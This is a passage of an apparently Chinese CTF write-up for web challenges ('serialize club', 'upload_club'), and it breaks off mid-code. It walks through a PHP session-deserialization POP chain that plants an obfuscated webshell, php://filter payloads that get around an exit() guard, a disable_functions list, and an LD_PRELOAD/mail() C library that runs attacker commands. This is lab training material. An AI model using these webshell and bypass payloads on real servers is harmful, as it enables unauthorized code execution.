class="hljs-string">&quot;&lt;?php &quot;</span>.<span class="hljs-keyword">$this</span>-&gt;cmd);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;A webshell is waiting for you&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>整合一下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;config/backdoor.php&quot;</span>;<br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php&#x27;</span>);<br>session_start();<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">neepu</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span><br>        <span class="hljs-comment">//! Neepu</span><br>        <span class="hljs-variable">$neepu</span>,<br>        <span class="hljs-comment">//! Memory-held data</span><br>        <span class="hljs-variable">$data</span>,<br>        <span class="hljs-comment">//! Info</span><br>        <span class="hljs-variable">$info</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;neepu = <span class="hljs-string">&quot;&lt;h1&gt;Welcome to serialize club :)&lt;/h1&gt;&quot;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;info[<span class="hljs-string">&#x27;info&#x27;</span>] = <span class="hljs-string">&quot;&lt;h1&gt;This is PHPINFO&lt;/h1&gt;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkinfo</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;info&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;neepu;<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;info[<span class="hljs-string">&#x27;info&#x27;</span>];<br>            phpinfo();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;neepu;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;info[<span class="hljs-string">&#x27;info&#x27;</span>]-&gt;data;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Neepu!&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">n33pu</span> </span>&#123;<br>    <span class="hljs-keyword">public</span><br>        <span class="hljs-comment">//! Neepu object</span><br>        <span class="hljs-variable">$obj</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-variable">$Neepu</span> = <span class="hljs-keyword">$this</span>-&gt;obj;<br>        <span class="hljs-keyword">return</span> serialize(<span class="hljs-variable">$Neepu</span>);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dumb</span> </span>&#123;<br>    <span class="hljs-keyword">public</span><br>        <span class="hljs-comment">//! dumb</span><br>        <span class="hljs-variable">$dumb</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">silly</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Who care about it?&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;dumb-&gt;silly();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backdoor</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span><br>        <span class="hljs-comment">//! eval code</span><br>        <span class="hljs-variable">$cmd</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/[;+=!@\$\&quot;\.\_\(\)\[\]]&#123;1,&#125;/i&#x27;</span>,<span class="hljs-keyword">$this</span>-&gt;cmd)) &#123;<br>            file_put_contents(<span class="hljs-string">&quot;/var/www/html/neepu.php&quot;</span>, <span class="hljs-string">&quot;&lt;?php &quot;</span>.<span class="hljs-keyword">$this</span>-&gt;cmd);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;A webshell is waiting for you&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$Neepu</span> = <span class="hljs-keyword">new</span> neepu();<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$Neepu</span>-&gt;checkinfo();<br></code></pre></td></tr></table></figure>
+
+<p>先POST一个<code>info</code>查看<code>phpinfo</code>：</p>
+<p><img src="https://woshilnp.github.io/wzimg/281.png" alt="a"></p>
+<p>这里使用两个引擎来分别处理就存在SESSION反序列化漏洞</p>
+<p>因为我们需要使用这个后门，就需要调用到<code>__invoke</code>魔术方法，就需要构造POP链</p>
+<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">class</span> silly -&gt;</span> __destruct<br>↓↓↓<br><span class="hljs-function"><span class="hljs-title">class</span> neepu -&gt;</span> __<span class="hljs-function"><span class="hljs-title">call</span> -&gt;</span> 建立neepu对象echo触发__toString<br>↓↓↓<br><span class="hljs-function"><span class="hljs-title">class</span> neepu -&gt;</span> __<span class="hljs-function"><span class="hljs-title">toString</span> -&gt;</span> 建立n33pu对象访问不存在的变量触发__get<br>↓↓↓<br><span class="hljs-function"><span class="hljs-title">class</span> n33pu -&gt;</span> __<span class="hljs-function"><span class="hljs-title">get</span> -&gt;</span> $N<span class="hljs-function"><span class="hljs-title">eepu</span>() -&gt;</span> 建立backdoor对象以函数形式调用backdoor对象触发__invoke<br>↓↓↓<br><span class="hljs-function"><span class="hljs-title">class</span> backdoor -&gt;</span> __<span class="hljs-function"><span class="hljs-title">invoke</span> -&gt;</span> 写入 webshell<br></code></pre></td></tr></table></figure>
+
+<p>EXP：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br>session_start();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">neepu</span> </span>&#123;<br>    <span class="hljs-keyword">public</span><br>        <span class="hljs-comment">//! Memory-held data</span><br>        <span class="hljs-variable">$data</span>,<br>        <span class="hljs-comment">//! Neepu</span><br>        <span class="hljs-variable">$neepu</span>,<br>        <span class="hljs-comment">//! Info</span><br>        <span class="hljs-variable">$info</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;info[<span class="hljs-string">&#x27;info&#x27;</span>] = <span class="hljs-keyword">new</span> n33pu();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">n33pu</span> </span>&#123;<br>    <span class="hljs-keyword">public</span><br>        <span class="hljs-comment">//! Neepu func</span><br>        <span class="hljs-variable">$func</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backdoor</span> </span>&#123;<br>    <span class="hljs-keyword">public</span><br>        <span class="hljs-comment">//! eval code</span><br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&#x27;$_=[];$_=@&quot;$_&quot;;$_=$_[&quot;!&quot;==&quot;@&quot;];$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__++;$__++;$____=&quot;_&quot;;$____.=$__;$____.=$___;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$_[_]($_[__]);&#x27;</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dumb</span> </span>&#123;<br>    <span class="hljs-keyword">public</span><br>        <span class="hljs-comment">//! dumb</span><br>        <span class="hljs-variable">$dumb</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> backdoor();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> neepu();<br><span class="hljs-variable">$b</span>-&gt;neepu = <span class="hljs-keyword">new</span> neepu();<br><span class="hljs-variable">$b</span>-&gt;neepu-&gt;info[<span class="hljs-string">&#x27;info&#x27;</span>]-&gt;func = <span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> dumb();<br><span class="hljs-variable">$c</span>-&gt;dumb = <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$z</span> = serialize(<span class="hljs-variable">$c</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;|&#x27;</span>.str_replace(<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;\\&quot;&#x27;</span>, <span class="hljs-variable">$z</span>);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">|O:4:\&quot;dumb\&quot;:1:&#123;s:4:\&quot;dumb\&quot;;O:5:\&quot;neepu\&quot;:3:&#123;s:4:\&quot;data\&quot;;N;s:5:\&quot;neepu\&quot;;O:5:\&quot;neepu\&quot;:3:&#123;s:4:\&quot;data\&quot;;N;s:5:\&quot;neepu\&quot;;N;s:4:\&quot;info\&quot;;a:1:&#123;s:4:\&quot;info\&quot;;O:5:\&quot;n33pu\&quot;:1:&#123;s:4:\&quot;func\&quot;;O:8:\&quot;backdoor\&quot;:1:&#123;s:3:\&quot;cmd\&quot;;s:230:\&quot;$_=[];$_=@\&quot;$_\&quot;;$_=$_[\&quot;!\&quot;==\&quot;@\&quot;];$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__++;$__++;$____=\&quot;_\&quot;;$____.=$__;$____.=$___;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$_[_]($_[__]);\&quot;;&#125;&#125;&#125;&#125;s:4:\&quot;info\&quot;;a:1:&#123;s:4:\&quot;info\&quot;;O:5:\&quot;n33pu\&quot;:1:&#123;s:4:\&quot;func\&quot;;N;&#125;&#125;&#125;&#125;</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure>
+
+<p>为了防止双引号被转义，在双引号前加上 <code>\</code>，除此之外还要加上 <code>|</code></p>
+<p>构造一个上传数据的页面<code>upload.html</code></p>
+<p>为什么能构造一个前端的东西上传东西呢，我之前也遇到过，查了下，是因为</p>
+<p><img src="https://woshilnp.github.io/wzimg/282.png" alt="a"></p>
+<p>由<code>phpinfo()</code>页面知，<code>session.upload_progress.enabled</code>为On。当一个上传在处理中，同时POST一个与INI中设置的<code>session.upload_progress.name</code>同名变量时，当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。所以可以通过<code>Session Upload Progress</code>来设置<code>session</code>。</p>
+<p>所以可以在前端构造<code>upload.html</code>：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://neepusec.club:18930/index.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;123&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>然后抓包修改<code>filename</code></p>
+<p><img src="https://woshilnp.github.io/wzimg/283.png" alt="a"></p>
+<p><img src="https://woshilnp.github.io/wzimg/284.png" alt="a"></p>
+<p><code>getshell</code>以后访问<code>neepu.php</code>，之前在<code>phpinfo</code>里发现还有<code>passthru</code>可以使用</p>
+<p>但是在根目录没有发现<code>flag</code>，猜测在<code>/root</code>里面，需要我们<code>SUID</code>提权</p>
+<p>详情参考：</p>
+<p><code>https://www.anquanke.com/post/id/242237#h3-13</code></p>
+<h3 id="upload-club"><a href="#upload-club" class="headerlink" title="upload_club"></a>upload_club</h3><p>知识点：</p>
+<p> 数组<code>[</code>解析变量名：</p>
+<p>通过<code>[</code> 来使得<code>php</code>认为传入的是数组从而绕过 <code>.</code> 变成 <code>_</code> 的转换</p>
+<p>二次编码绕过：</p>
+<p>其实就是因为<code>file_put_contents</code>经过伪代码处理只进行了一次<code>url</code>加密，</p>
+<p>过滤器绕死亡函数<code>exit</code>：</p>
+<p>参考<code>https://woshilnp.github.io/2021/05/23/详解php-filter以及死亡绕过</code></p>
+<p><code>file_get_contents</code> 与 <code>require_once</code> 的 <code>Data URL</code> 识别：</p>
+<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">file_get_contents</span> 允许使用 <span class="hljs-class"><span class="hljs-keyword">data</span> <span class="hljs-type">URI</span>，会直接返回后面的内容，很奇怪的是，在 allow_url_include=<span class="hljs-type">Off</span> 的情况下，不允许 require_once <span class="hljs-keyword">data</span> <span class="hljs-type">URI</span> 的，但是如果 `<span class="hljs-keyword">data</span>:,<span class="hljs-type">XXX</span>` 是一个目录名的话，就会放开限制。</span><br></code></pre></td></tr></table></figure>
+
+<p>测试效果如下：</p>
+<p><img src="https://woshilnp.github.io/wzimg/276.png" alt="a"></p>
+<p><code>df</code>绕过：</p>
+<p>用 mail() 函数 绕过</p>
+<blockquote>
+<p>PHP 的 <code>mail()</code> 函数调用 <code>execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;/usr/sbin/sendmail -t -i &quot;], ...)</code> 。由于这种实现，如果我们使用自写动态库设置环境变量 <code>LD_PRELOAD</code> ，从而修改 <code>/bin/sh</code> 的行为并获得命令执行。</p>
+</blockquote>
+<p>解题：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;title&gt;neepu_sec.club&lt;/title&gt;<br>&lt;body background=<span class="hljs-string">&quot;bg.jpg&quot;</span>&gt;<br>&lt;font color=<span class="hljs-string">&quot;green&quot;</span>&gt;&lt;h1&gt;Welcome to neepu sec club, <span class="hljs-keyword">try</span> to upload your content :)&lt;/h1&gt;&lt;/font&gt;<br>&lt;font size = <span class="hljs-number">5</span>&gt;&lt;p&gt;Here is &lt;a href=<span class="hljs-string">&quot;source.php&quot;</span>&gt;source&lt;/a&gt; <span class="hljs-keyword">and</span> &lt;a href=<span class="hljs-string">&quot;uploads/sample/sample.txt&quot;</span>&gt;sample&lt;/a&gt;&lt;/p&gt;&lt;/font&gt;<br><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$uploadclub</span> = (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]) ? <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] : md5(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]));<br><span class="hljs-variable">$uploadclub</span> = basename(str_replace([<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;-&#x27;</span>,<span class="hljs-string">&#x27;(&#x27;</span>,<span class="hljs-string">&#x27;`&#x27;</span>,<span class="hljs-string">&#x27;&lt;&#x27;</span>],[<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>], <span class="hljs-variable">$uploadclub</span>));<br>@mkdir(<span class="hljs-string">&#x27;uploads/&#x27;</span>.<span class="hljs-variable">$uploadclub</span>);<br>@chdir(<span class="hljs-string">&#x27;uploads/&#x27;</span>.<span class="hljs-variable">$uploadclub</span>);<br>print_r(<span class="hljs-string">&quot;Upload: uploads/&quot;</span>.<span class="hljs-variable">$uploadclub</span>);<br><span class="hljs-variable">$check</span> = file_get_contents(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/25/&#x27;</span>, <span class="hljs-variable">$check</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;br /&gt;No more 25 :(&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    extract(<span class="hljs-variable">$_POST</span>);<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>        <span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;neepu_sec.club&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/iconv|UCS|UTF|rot|quoted|base64|zlib|string|tripledes|ini|htaccess|\\|#|\&lt;\?/i&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;&lt;br /&gt;hacker!!!&#x27;</span>);<br>    &#125;<br>    <span class="hljs-variable">$content</span> = str_replace(<span class="hljs-string">&#x27;.php&#x27;</span>,<span class="hljs-string">&#x27;neepu&#x27;</span>,<span class="hljs-variable">$content</span>);<br>    <span class="hljs-variable">$content</span> = str_replace(<span class="hljs-string">&#x27;.phtml&#x27;</span>,<span class="hljs-string">&#x27;neepu&#x27;</span>,<span class="hljs-variable">$content</span>);<br>    file_put_contents(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;&lt;?php exit();&#x27;</span>.<span class="hljs-variable">$content</span>);<br>    chdir(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-keyword">if</span>(!stripos(file_get_contents(<span class="hljs-variable">$content</span>),<span class="hljs-string">&#x27;&lt;?&#x27;</span>) &amp;&amp; !stripos(file_get_contents(<span class="hljs-variable">$content</span>),<span class="hljs-string">&#x27;php&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">require_once</span>(<span class="hljs-variable">$content</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    chdir(<span class="hljs-keyword">__DIR__</span>);<br>    @rmdir(<span class="hljs-string">&#x27;uploads/&#x27;</span>.<span class="hljs-variable">$uploadclub</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>通过上面知识点可以写入并包含 shell 文件</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># phpinfo()</span><br><span class="hljs-attribute">neepu</span>[sec.club=php://filter/write=convert.%<span class="hljs-number">6</span>%<span class="hljs-number">39</span>conv.%<span class="hljs-number">5</span>%<span class="hljs-number">35</span>CS-<span class="hljs-number">2</span>LE.%<span class="hljs-number">5</span>%<span class="hljs-number">35</span>CS-<span class="hljs-number">2</span>BE|?%<span class="hljs-number">3</span>Chp%<span class="hljs-number">20</span>phpipfn(o;)%<span class="hljs-number">3</span>E?/resource=w<span class="hljs-number">0</span>s<span class="hljs-number">1</span>np<br><span class="hljs-attribute">X</span>-Forwarded-For: data:,<span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure>
+
+<p>然后再包含该文件</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">neepu</span>[sec.club=data:,<span class="hljs-number">123456</span>/w<span class="hljs-number">0</span>s<span class="hljs-number">1</span>np<br></code></pre></td></tr></table></figure>
+
+<p>查看 disable_functions</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">passthru,exec,system,chroot,chgrp,chown,shell_exec,popen,proc_open,pcntl_exec,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,imap_open,apache_setenv,chmod,posix_mkfifo,pg_lo_import,dbmopen,dbase_open,define_syslog_variables,posix_getpwuid,posix_uname,proc_close,pclose,proc_nice,proc_terminate,curl_exec,curl_multi_exec,parse_ini_file,show_source,fopen,copy,rename,readfile,tmpfile,tempnam,touch,link,file,ftp_connect,ftp_ssl_connect<br></code></pre></td></tr></table></figure>
+
+<p>用 mail() 函数 绕过</p>
+<blockquote>
+<p>PHP 的 <code>mail()</code> 函数调用 <code>execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;/usr/sbin/sendmail -t -i &quot;], ...)</code> 。由于这种实现，如果我们使用自写动态库设置环境变量 <code>LD_PRELOAD</code> ，从而修改 <code>/bin/sh</code> 的行为并获得命令执行。</p>
+</blockquote>
+<p>即使 <code>/usr/sbin/sendmail</code> 不存在，也可以使用，重写 <code>getuid()</code> 函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">payload</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *cmd)</span> </span>&#123;<br>  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">512</span>];<br>  <span class="hljs-built_in">strcpy</span>(buf, cmd);<br>  <span class="hljs-built_in">strcat</span>(buf, <span class="hljs-string">&quot; &gt; /tmp/_0utput.txt&quot;</span>);<br>  system(buf);&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getuid</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">char</span> *cmd;<br>  <span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>) == <span class="hljs-literal">NULL</span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; &#125;<br>  unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>  <span class="hljs-keyword">if</span> ((cmd = getenv(<span class="hljs-string">&quot;_evilcmd&quot;</span>)) != <span 